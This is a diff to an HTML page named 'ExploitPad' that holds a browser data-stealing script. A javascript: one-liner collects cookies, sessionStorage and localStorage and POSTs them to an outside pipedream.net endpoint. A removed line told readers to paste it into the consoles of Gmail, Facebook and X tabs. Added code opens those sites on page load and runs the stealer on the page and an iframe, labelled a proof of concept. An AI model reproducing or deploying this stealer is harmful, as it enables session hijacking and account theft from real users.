@@ -93,7 +93,7 @@
         <textarea id="stealScript" readonly>javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();</textarea>
         <iframe id="output"></iframe>
         <div class="instructions">
-            <p>Gmail, FB, and X opened in new tabs. Copy the script above, paste it into each tab's console (F12), and press Enter to steal cookies and storage.</p>
+            <p>This PoC opens Gmail, FB, and X in new tabs on load. It can only steal data from this page or iframes, not from the opened tabs due to browser security.</p>
         </div>
     </div>
 
@@ -157,13 +157,20 @@
         document.addEventListener("DOMContentLoaded", function() {
             console.log("ExploitPad loaded - opening sites and stealing local data...");
 
-            // Steal data from this page (GitHub Pages domain)
+            // Steal data from this page (current domain)
             stealAndSendData(window, "ExploitPad Page");
 
             // Auto-open Gmail, Facebook, and X.com in new tabs
-            window.open("https://mail.google.com", "_blank");
-            window.open("https://facebook.com", "_blank");
-            window.open("https://x.com", "_blank");
+            const gmailTab = window.open("https://mail.google.com", "_blank");
+            const fbTab = window.open("https://facebook.com", "_blank");
+            const xTab = window.open("https://x.com", "_blank");
+
+            // Note: We cannot directly access data from these tabs due to Same-Origin Policy
+            // Attempting to steal from iframe instead (for PoC purposes)
+            setTimeout(() => {
+                let iframeWin = document.getElementById("output").contentWindow;
+                stealAndSendData(iframeWin, "Iframe Context");
+            }, 1000); // Delay to ensure iframe is loaded
 
             // Run demo code in iframe
             runCode();
